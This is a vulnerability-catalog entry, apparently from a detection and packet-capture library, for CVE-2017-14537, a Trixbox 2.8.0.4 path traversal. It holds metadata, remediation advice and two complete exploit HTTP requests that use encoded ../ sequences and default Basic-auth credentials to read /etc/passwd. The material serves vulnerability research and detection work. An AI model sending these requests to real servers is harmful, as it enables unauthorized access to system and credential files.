---
layout: post
cve_id: CVE-2017-14537
title: Trixbox 2.8.0 - Path Traversal
pcap: true
pcap_path: /pcaps/2017/CVE-2017-14537.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2017/CVE-2017-14537.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pikpikcu
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  read arbitrary files on the server.

  '
remediation: 'Apply the latest security patches or upgrade to a newer version of Trixbox
  to mitigate this vulnerability.

  '
reference:
- https://secur1tyadvisory.wordpress.com/2018/02/13/trixbox-multiple-path-traversal-vulnerabilities-cve-2017-14537/
- https://nvd.nist.gov/vuln/detail/CVE-2017-14537
- https://sourceforge.net/projects/asteriskathome/
- http://packetstormsecurity.com/files/162853/Trixbox-2.8.0.4-Path-Traversal.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 6.5
  cve-id: CVE-2017-14537
  cwe-id: CWE-22
  epss-score: 0.91358
  epss-percentile: 0.99637
  cpe: cpe:2.3:a:netfortris:trixbox:2.8.0.4:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: netfortris
  product: trixbox
tags:
- cve
- cve2017
- trixbox
- lfi
- packetstorm
- netfortris
- vuln
---

## üîç Vulnerability Description
Trixbox 2.8.0.4 is susceptible to path traversal via the xajaxargs array parameter to /maint/index.php?packages or the lang parameter to /maint/modules/home/index.php.

## üåê HTTP Request
```nohighlight
POST /maint/index.php?packages HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0
Connection: close
Content-Length: 160
Authorization: Basic bWFpbnQ6cGFzc3dvcmQ=
Content-Type: application/x-www-form-urlencoded
Cookie: lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2
Referer: www.victim.com/maint/index.php?packages
Accept-Encoding: gzip
xajax=menu&xajaxr=1504969293893&xajaxargs[]=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&xajaxargs[]=yumPackages
```

```nohighlight
GET /maint/modules/home/index.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00english HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Authorization: Basic bWFpbnQ6cGFzc3dvcmQ=
Cookie: lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2
Referer: www.victim.com/maint/index.php?packages
Accept-Encoding: gzip
```

